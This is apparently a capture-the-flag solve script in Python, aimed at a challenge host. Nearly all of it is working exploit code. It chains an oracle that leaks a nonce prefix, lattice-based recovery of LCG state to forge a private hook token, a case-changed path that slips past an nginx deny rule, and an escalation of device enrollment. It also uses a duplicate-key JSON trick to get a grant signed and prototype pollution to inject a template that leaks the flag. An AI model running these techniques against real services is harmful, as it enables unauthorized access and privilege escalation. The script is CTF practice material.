#!/usr/bin/env python3

import base64
import hashlib
import hmac
import json
import os
import re
import struct
import time
import zlib

import requests


TARGET = os.environ.get(
    "TARGET",
    "http://fluxion-f4efe1f76cec3abf.challs.ctf.thefewchosen.com",
).rstrip("/")


class Solver:
    def __init__(self):
        self.http = requests.Session()
        self.rpc_url = TARGET + "/api/rpc"

    def rpc(self, method, params=None):
        r = self.http.post(
            self.rpc_url,
            json={"method": method, "params": params or {}},
            timeout=40,
        )
        r.raise_for_status()
        body = r.json()
        if "result" not in body:
            raise RuntimeError(f"RPC {method} failed: {body}")
        return body["result"]

    @staticmethod
    def b64u(data):
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    @staticmethod
    def b64u_decode(value):
        return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))

    def recover_nonce(self, run_id):
        prefix = ""
        for _ in range(16):
            for c in "0123456789abcdef":
                result = self.rpc(
                    "searchRuns",
                    {"filter": {"approvalNonce": {"$startsWith": prefix + c}}},
                )
                if result.get("count") == 1:
                    prefix += c
                    break
            else:
                raise RuntimeError(f"approvalNonce prefix stopped at {prefix!r}")
        result = self.rpc(
            "searchRuns", {"filter": {"approvalNonce": {"$startsWith": prefix}}}
        )
        if not result.get("results") or result["results"][0]["runId"] != run_id:
            raise RuntimeError("approvalNonce oracle returned an unexpected run")
        return prefix

    def recover_private_hook_token(self, step_ids):
        """Recover the next LCG output from five 24-bit truncated outputs."""
        try:
            from fpylll import CVP, IntegerMatrix, LLL
        except ImportError as exc:
            raise RuntimeError("solve.py needs the fpylll package") from exc

        A = 6364136223846793005
        C = 1442695040888963407
        MOD = 1 << 64
        LOW = 1 << 40
        observed = [int.from_bytes(self.b64u_decode(x), "big") for x in step_ids]
        if len(observed) != 5:
            raise RuntimeError("the gated run must expose five step IDs")

        powers = []
        aa, cc = 1, 0
        for _ in range(5):
            powers.append((aa, cc))
            aa = (A * aa) % MOD
            cc = (A * cc + C) % MOD

        high0 = observed[0]
        offsets = []
        for i in range(1, 5):
            a_i, c_i = powers[i]
            offsets.append(a_i * high0 * LOW + c_i - observed[i] * LOW)

        basis = IntegerMatrix(5, 5)
        basis[0, 0] = 1
        for j in range(1, 5):
            basis[0, j] = powers[j][0]
        for i in range(1, 5):
            basis[i, i] = MOD
        LLL.reduction(basis)
        target = [0] + [-x for x in offsets]
        closest = CVP.closest_vector(basis, target)
        low0 = int(closest[0])
        if not 0 <= low0 < LOW:
            raise RuntimeError("LCG state recovery produced an invalid low part")

        state = observed[0] * LOW + low0
        states = [state]
        for _ in range(5):
            state = (A * state + C) % MOD
            states.append(state)
        if [x >> 40 for x in states[:5]] != observed:
            raise RuntimeError("LCG state recovery failed validation")
        return self.b64u(states[5].to_bytes(8, "big"))

    @staticmethod
    def make_frame(frame_type, flags, seq, sid, payload=b""):
        header = (
            b"FX"
            + bytes([1, frame_type, flags, seq])
            + struct.pack(">I", sid)
            + len(payload).to_bytes(3, "big")
        )
        return header + payload + struct.pack(">I", zlib.crc32(header + payload) & 0xFFFFFFFF)

    @staticmethod
    def parse_frame(raw):
        if len(raw) < 17 or raw[:3] != b"FX\x01":
            raise RuntimeError("invalid FCP response")
        length = int.from_bytes(raw[10:13], "big")
        if len(raw) != 17 + length:
            raise RuntimeError("invalid FCP response length")
        if zlib.crc32(raw[: 13 + length]) & 0xFFFFFFFF != int.from_bytes(raw[13 + length :], "big"):
            raise RuntimeError("invalid FCP response CRC")
        return {
            "type": raw[3],
            "seq": raw[5],
            "sid": int.from_bytes(raw[6:10], "big"),
            "payload": raw[13 : 13 + length],
            "raw": raw,
        }

    def fcp(self, frame):
        # nginx denies lowercase /fcp, while Express route matching is case-insensitive.
        r = self.http.post(
            TARGET + "/FCP",
            data=frame,
            headers={"Content-Type": "application/octet-stream"},
            timeout=60,
        )
        r.raise_for_status()
        return self.parse_frame(r.content)

    def arm(self, enrollment, run_id, nonce):
        hello = self.make_frame(1, 0, 0, 0, enrollment.encode())
        challenge = self.fcp(hello)
        if challenge["type"] != 0x81:
            raise RuntimeError(f"HELLO rejected: {challenge['payload']!r}")
        sid = challenge["sid"]
        server_salt = challenge["payload"][:8]
        session_key = hmac.new(nonce.encode(), server_salt, hashlib.sha256).digest()[:16]

        kex_payload = hmac.new(
            session_key, hello + challenge["raw"], hashlib.sha256
        ).digest()[:8]
        kex = self.make_frame(2, 0, 1, sid, kex_payload)
        kex_ok = self.fcp(kex)
        if kex_ok["type"] != 0x82:
            raise RuntimeError(f"KEX rejected: {kex_ok['payload']!r}")
        transcript = hello + challenge["raw"] + kex + kex_ok["raw"]

        chain = kex_ok["payload"]
        seq = 2
        rung_index = 0
        while True:
            rung = hmac.new(
                session_key,
                b"FXTICK" + chain + bytes([rung_index]),
                hashlib.sha256,
            ).digest()[:8]
            tick = self.make_frame(4, 0, seq, sid, rung)
            while True:
                tock = self.fcp(tick)
                if tock["type"] != 0xEE:
                    break
                message = tock["payload"].decode(errors="replace")
                match = re.fullmatch(r"E_TOO_SOON:(\d+)", message)
                if not match:
                    raise RuntimeError(f"TICK rejected: {message}")
                time.sleep(int(match.group(1)) / 1000 + 0.05)
            if tock["type"] != 0x84 or len(tock["payload"]) != 14:
                raise RuntimeError(f"unexpected TICK reply: {tock['payload']!r}")
            remaining = int.from_bytes(tock["payload"][:2], "big")
            chain = tock["payload"][6:14]
            rung_index += 1
            seq += 1
            if remaining == 0:
                break

        run_bytes = run_id.encode()
        arm_tag = hmac.new(session_key, transcript + run_bytes, hashlib.sha256).digest()[:16]
        armed = self.fcp(self.make_frame(3, 1, seq, sid, run_bytes + arm_tag))
        if armed["type"] != 0x83:
            raise RuntimeError(f"ARM rejected: {armed['payload']!r}")
        return armed["payload"].decode()

    def run(self):
        runs = self.rpc("fetchRuns")
        gated = next((x for x in runs if x["workflowName"] == "admin-provision-approval"), None)
        if not gated:
            raise RuntimeError("gated provisioning run not found")
        run_id = gated["runId"]

        nonce = self.recover_nonce(run_id)
        events = self.rpc("fetchEvents", {"runId": run_id})["events"]
        step_ids = [x["stepId"] for x in events]
        hook_token = self.recover_private_hook_token(step_ids)

        enrollment = self.rpc(
            "enrollDevice",
            {"profile": {"tier": "operator", "scopes": ["read", "arm", "provision"]}},
        ).get("enrollment")
        if not enrollment:
            raise RuntimeError("operator enrollment escalation failed")
        arm_token = self.arm(enrollment, run_id, nonce)

        # The signer checks the first act with a regex, but JSON.parse keeps the last one.
        duplicate_act = (
            '{"aud":"approvals","act":"read","runId":"'
            + run_id
            + '","nonce":"'
            + nonce
            + '","act":"resume"}'
        )
        grant = self.rpc("previewApprovalGrant", {"document": duplicate_act}).get("grant")
        if not grant:
            raise RuntimeError("preview grant was not signed")
        resumed = self.rpc(
            "resumeHook",
            {
                "token": hook_token,
                "grant": grant,
                "armToken": arm_token,
                "payload": {"approved": True},
            },
        )
        if resumed.get("status") != "completed":
            raise RuntimeError(f"private hook was not resumed: {resumed}")

        # mergeDeep() permits constructor.prototype traversal and pollutes Object.prototype.
        caption = "${engine.runs." + run_id + "._flag}"
        self.rpc(
            "saveViewPreferences",
            {"prefs": {"constructor": {"prototype": {"presentation": {"caption": caption, "token": nonce}}}}},
        )
        report = self.rpc("renderRunReport", {"runId": run_id})
        match = re.search(r"TFC\{[^}]+\}", json.dumps(report))
        if not match:
            raise RuntimeError(f"flag not found in report: {report}")
        print(f"<FLAG>{match.group(0)}</FLAG>")


if __name__ == "__main__":
    try:
        Solver().run()
    except Exception as exc:
        raise SystemExit(f"solve failed: {exc}")
